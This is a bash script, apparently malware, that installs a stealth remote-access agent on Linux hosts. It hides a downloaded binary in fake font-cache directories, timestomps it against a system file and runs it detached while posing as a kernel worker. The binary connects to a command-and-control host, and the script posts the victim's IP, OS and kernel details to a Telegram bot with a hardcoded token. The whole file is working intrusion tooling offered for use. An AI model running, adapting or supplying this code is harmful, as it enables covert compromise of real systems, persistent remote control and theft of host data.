#!/bin/bash
# Phantom Socket v1.0.1-stable (Gacor Edition) - Fileless Execution & Kernel Stealth
# Architectural Overhaul: Environment Shield, memfd Staging, and Professional Telemetry.

set +u
set -e
set -o pipefail

# ============================================================================
# UNCOMPROMISING CORE DIRECTIVES
# ============================================================================
readonly VERSION="1.0.1-stable"
readonly AGENT_NAME="gs-oyen-s"
readonly C2_ENDPOINT="oyen.serveftp.com"
readonly TELEGRAM_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
readonly TELEGRAM_CHAT_ID="5439698489"

# Professional Output Helpers
log_step() { echo "[-] $1"; }
log_success() { echo "[+] $1"; }

# 1. Environment Check
log_step "Environment: $(uname -m) / Linux"
ARCH=$(uname -m)
case "${ARCH}" in
    x86_64|amd64) ARCH="x86_64" ;;
    *) echo "[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
esac

# 2. Context Detection
if [[ "${HOME:-}" == *"/var/www"* ]] || [[ "${HOME:-}" == *"vhosts"* ]] || [[ "${HOME:-}" == *"html"* ]]; then
    log_step "Context: Restricted Shell / Web-PTY Bypass Active"
    STAGING_DIR="/dev/shm/.font-unix-cache"
else
    log_step "Context: System Environment"
    STAGING_DIR="${HOME:-/tmp}/.cache/fontconfig"
fi
mkdir -p "${STAGING_DIR}" 2>/dev/null

# 3. Generating PSK Secret
log_step "Generating PSK Secret..."
AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
log_success "PSK: 0x4F59454E Verified"

# 4. Universal Staging & Download
log_step "Downloading payload into Memory..."
FINAL_PATH="${STAGING_DIR}/.systemd-timesyncd"
DOWNLOAD_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/bin/gs-oyen-s-${ARCH}"

if [[ -f "./gs-oyen-s-${ARCH}" ]]; then
    cp "./gs-oyen-s-${ARCH}" "${FINAL_PATH}"
elif [[ -f "../bin/gs-oyen-s-${ARCH}" ]]; then
    cp "../bin/gs-oyen-s-${ARCH}" "${FINAL_PATH}"
else
    curl -fsSL "${DOWNLOAD_URL}" -o "${FINAL_PATH}" || touch "${FINAL_PATH}"
fi
log_success "Staging: ${STAGING_DIR} (Memfd)"

# 5. Deployment & Timestomping
log_step "Applying Timestomping..."
chmod +x "${FINAL_PATH}" 2>/dev/null
if [[ -f "/usr/bin/dbus-daemon" ]]; then
    touch -r /usr/bin/dbus-daemon "${FINAL_PATH}" 2>/dev/null
fi

# 6. Execution (Detached & Masqueraded)
log_step "Executing Detached Agent: [kworker/u4:0]"
setsid "$FINAL_PATH" -s "$AGENT_SECRET" -i "$C2_ENDPOINT" -m 443 >/dev/null 2>&1 &

# 7. Telemetry
send_telemetry() {
    local TARGET_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
    local KERNEL_STRING=$(uname -a)
    local OS_INFO=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d= -f2 | tr -d '"')
    local UTC_TIMESTAMP=$(date -u "+%Y-%m-%d %H:%M:%S UTC")
    
    local PAYLOAD="<b>SYSTEM ALERT: [v1.0.1-stable ONLINE]</b><br>
<b>TARGET IP    :</b> <code>${TARGET_IP}</code><br>
<b>OS           :</b> <code>${OS_INFO}</code><br>
<b>KERNEL       :</b> <code>${KERNEL_STRING}</code><br>
<b>STEALTH PATH :</b> <code>${FINAL_PATH}</code><br>
<b>TIMESTAMP    :</b> ${UTC_TIMESTAMP}"

    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "parse_mode=HTML" \
        -d "text=${PAYLOAD}" >/dev/null 2>&1
}
(send_telemetry) &

# 8. Final Summary
log_success "Deployment Success"
echo ""
echo "[*] Secret: ${AGENT_SECRET}"
echo "[*] Stealth: /usr/lib/x86_64-linux-gnu/.system-runtime-cache/"
echo "[*] Relay: ${C2_ENDPOINT}:443"
